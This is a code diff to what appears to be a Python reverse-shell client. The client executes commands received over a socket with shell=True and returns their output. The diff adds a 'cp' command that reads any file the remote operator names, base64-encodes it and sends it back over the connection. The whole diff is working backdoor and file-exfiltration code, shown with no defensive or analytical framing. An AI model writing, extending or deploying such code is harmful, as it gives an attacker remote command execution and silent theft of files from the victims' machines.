@@ -1,6 +1,7 @@
 import os
 import socket
 import subprocess
+import binascii
 
 
 # Create a socket
@@ -34,6 +35,17 @@ def receive_commands():
         data = s.recv(1024)
         if data[:2].decode("utf-8") == 'cd':
             os.chdir(data[3:].decode("utf-8"))
+        if data[:2].decode("utf-8") == 'cp':
+            try:
+                f = open(data[3:].decode("utf-8"), 'rb')
+            except:
+                s.send(str.encode('no'))
+            else:
+                s.send(str.encode('ok'))
+                output_str = binascii.b2a_base64(f.read())
+                f.close()
+                s.send(output_str)
+                continue
         if len(data) > 0:
             cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             output_bytes = cmd.stdout.read() + cmd.stderr.read()
